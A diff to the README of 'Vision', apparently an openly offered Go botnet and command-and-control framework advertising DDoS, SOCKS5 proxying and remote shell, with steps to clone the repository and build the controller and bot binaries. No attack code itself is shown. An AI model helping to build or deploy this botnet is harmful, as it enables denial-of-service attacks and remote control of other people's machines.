@@ -1,9 +1,9 @@
 
 <div align="center">
 
-# ☾℣☽ision - **Advanced Go-Based C2 & Botnet**  
+# ☾℣☽ision - **Advanced Go-Based Botnet**  
 
-**DDoS • SOCKS5 Proxying • Remote Shell • Multi-Architecture**
+**DDoS • SOCKS5 Proxying • Remote Shell • Multi-Architecture • TUI View**
 
 ![Go](https://img.shields.io/badge/Go-1.23.0+-00ADD8?style=for-the-badge)
 ![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-009688?style=for-the-badge)
@@ -47,8 +47,10 @@ sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 scre
 ### Installation
 ```bash
 git clone https://github.com/Syn2Much/VisionC2.git
+
 cd VisionC2
 chmod +x *
+
 python3 setup.py
 # CNC and Bot Binaries will be built during this proccess
 ```
